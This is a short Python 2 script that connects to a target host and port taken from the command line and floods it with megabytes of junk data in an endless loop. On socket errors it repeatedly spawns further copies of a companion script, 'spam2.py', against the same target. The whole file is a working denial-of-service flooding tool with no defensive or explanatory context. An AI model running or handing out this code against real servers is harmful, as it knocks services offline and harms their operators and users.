#!/usr/bin/env python

import socket
import subprocess as sub
from sys import argv
from time import sleep

text = "\t "
for x in xrange(50, 256):
    text += chr(x) * 10000
n = 0

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((argv[1], int(argv[2])))
print "Connected"
sock.setblocking(False)

while True:
    try:
        sock.send(text)
    except socket.error:
        if n % 100 == 0:
            print ["python", "spam2.py"] + argv[1:3]
            sub.Popen(["python", "spam2.py"] + argv[1:3], stdout=sub.PIPE)
        n += 1
